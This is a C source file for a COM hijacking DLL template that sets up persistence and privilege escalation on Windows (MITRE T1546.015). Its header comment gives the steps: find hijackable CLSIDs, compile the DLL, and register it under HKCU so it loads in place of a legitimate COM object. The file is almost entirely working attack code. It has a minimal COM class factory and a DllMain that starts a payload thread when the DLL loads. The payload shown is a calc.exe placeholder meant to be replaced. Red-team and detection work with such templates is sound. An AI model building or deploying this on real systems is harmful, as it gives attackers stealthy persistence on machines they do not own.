/*
 * COM Hijacking Payload — CLSID Hijack for Persistence + Privilege Escalation
 *
 * Attack Vector:
 *   Windows COM objects are resolved via registry CLSIDs.
 *   HKCU\Software\Classes\CLSID takes precedence over HKLM.
 *   By registering a malicious DLL under HKCU for a CLSID the target
 *   app uses, our DLL loads instead of the legitimate one.
 *
 * MITRE ATT&CK: T1546.015 — Component Object Model Hijacking
 * Severity: HIGH (persistence), CRITICAL (if service loads the COM object)
 *
 * Steps:
 *   1. Use find_com_targets.ps1 to identify hijackable CLSIDs
 *   2. Compile this DLL
 *   3. Register under HKCU for the target CLSID
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -shared -o payload.dll com_hijack_template.c -lole32
 *   cl /LD com_hijack_template.c ole32.lib /Fe:payload.dll
 */

#include <windows.h>
#include <objbase.h>

#pragma comment(lib, "ole32.lib")

void Payload(void) {
    WinExec("calc.exe", SW_SHOW);
}

// Minimal COM class factory so the COM runtime accepts this DLL
typedef struct {
    IClassFactoryVtbl* vtbl;
    LONG refCount;
} MyClassFactory;

static HRESULT STDMETHODCALLTYPE CF_QueryInterface(IClassFactory* This, REFIID riid, void** ppv) {
    *ppv = NULL;
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IClassFactory)) {
        *ppv = This;
        This->lpVtbl->AddRef(This);
        return S_OK;
    }
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE CF_AddRef(IClassFactory* This) {
    return InterlockedIncrement(&((MyClassFactory*)This)->refCount);
}

static ULONG STDMETHODCALLTYPE CF_Release(IClassFactory* This) {
    return InterlockedDecrement(&((MyClassFactory*)This)->refCount);
}

static HRESULT STDMETHODCALLTYPE CF_CreateInstance(IClassFactory* This, IUnknown* pOuter, REFIID riid, void** ppv) {
    *ppv = NULL;
    return E_NOTIMPL;
}

static HRESULT STDMETHODCALLTYPE CF_LockServer(IClassFactory* This, BOOL fLock) {
    return S_OK;
}

static IClassFactoryVtbl cf_vtbl = {
    CF_QueryInterface, CF_AddRef, CF_Release, CF_CreateInstance, CF_LockServer
};
static MyClassFactory g_ClassFactory = { &cf_vtbl, 0 };

// Standard COM DLL exports
__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    return CF_QueryInterface((IClassFactory*)&g_ClassFactory, riid, ppv);
}

__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) {
    return S_FALSE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void) {
    return S_OK;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
    }
    return TRUE;
}
